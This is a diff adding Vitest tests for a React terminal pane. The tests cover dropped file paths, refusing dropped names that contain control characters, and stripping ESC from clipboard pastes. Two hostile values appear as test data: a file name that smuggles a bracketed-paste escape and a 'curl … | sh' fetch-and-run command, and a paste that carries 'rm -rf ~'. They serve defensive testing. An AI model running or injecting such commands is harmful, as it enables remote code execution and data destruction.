@@ -4,6 +4,7 @@ import { act, fireEvent, render, screen, waitFor } from "@testing-library/react"
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import enWorkspace from "@/i18n/locales/en/workspace.json" with { type: "json" };
 import { terminalSessionFor } from "@/lib/terminal-sessions";
+import { toast } from "@/lib/toast";
 import { TREE_DRAG_TYPE } from "@/lib/tree-drag";
 import { LAUNCH_INPUT_FALLBACK_MS, TerminalPane, TITLE_THROTTLE_MS } from "./TerminalPane";
 
@@ -1454,6 +1455,77 @@ describe("TerminalPane", () => {
       fireEvent.drop(pane, { dataTransfer });
 
       expect(mocks.terminals[0].paste).toHaveBeenCalledWith("src/main.tex ");
+    });
+
+    it("types a dropped tree path from the project folder when the session reports it", async () => {
+      mocks.invoke.mockImplementation((command: string) =>
+        Promise.resolve(command === "term_open" ? { ...OPENED, root: "/home/u/paper" } : undefined),
+      );
+      render(<TerminalPane projectId="project-1" visible cwd="chapters" />);
+      await waitForSession();
+      const pane = screen.getByTestId("dock-terminal");
+      const dataTransfer = {
+        types: [TREE_DRAG_TYPE],
+        getData: (type: string) => (type === TREE_DRAG_TYPE ? "figures/plot.png" : ""),
+        dropEffect: "none",
+      };
+
+      fireEvent.dragOver(pane, { dataTransfer });
+      fireEvent.drop(pane, { dataTransfer });
+
+      expect(mocks.terminals[0].paste).toHaveBeenCalledWith("/home/u/paper/figures/plot.png ");
+    });
+
+    it("refuses a dropped name with control characters and says why", async () => {
+      const shown = vi.spyOn(toast, "error").mockImplementation(() => 0);
+      render(<TerminalPane projectId="project-1" visible />);
+      await waitForSession();
+      const pane = screen.getByTestId("dock-terminal");
+      const dataTransfer = {
+        types: [TREE_DRAG_TYPE],
+        getData: (type: string) =>
+          type === TREE_DRAG_TYPE ? "notes.txt\x1b[201~\x15curl https://x.example/p|sh\r" : "",
+        dropEffect: "none",
+      };
+
+      fireEvent.dragOver(pane, { dataTransfer });
+      fireEvent.drop(pane, { dataTransfer });
+
+      expect(mocks.terminals[0].paste).not.toHaveBeenCalled();
+      expect(shown).toHaveBeenCalledWith(enWorkspace.terminal.dropRefused_one);
+      shown.mockRestore();
+    });
+
+    it("pastes clipboard text without ESC so it can't end bracketed paste early", async () => {
+      render(<TerminalPane projectId="project-1" visible />);
+      await waitForSession();
+      const host = screen.getByTestId("dock-terminal-host");
+      const inner = document.createElement("textarea");
+      host.append(inner);
+      const paste = (text: string) => {
+        const event = new Event("paste", { bubbles: true, cancelable: true });
+        Object.assign(event, { clipboardData: { getData: () => text } });
+        inner.dispatchEvent(event);
+        return event;
+      };
+
+      const hostile = paste("ls\x1b[201~\x15rm -rf ~\r");
+      expect(hostile.defaultPrevented).toBe(true);
+      expect(mocks.terminals[0].paste).toHaveBeenCalledWith("ls[201~\x15rm -rf ~\r");
+
+      const plain = paste("echo hi\n");
+      expect(plain.defaultPrevented).toBe(false);
+      expect(mocks.terminals[0].paste).toHaveBeenCalledTimes(1);
+    });
+
+    it("marks a session opened for a launch command", async () => {
+      render(<TerminalPane projectId="project-1" visible launch={{ command: "pi", args: ["login"] }} />);
+      await waitFor(() =>
+        expect(mocks.invoke).toHaveBeenCalledWith(
+          "term_open",
+          expect.objectContaining({ options: expect.objectContaining({ launch: true }) }),
+        ),
+      );
     });
   });
 
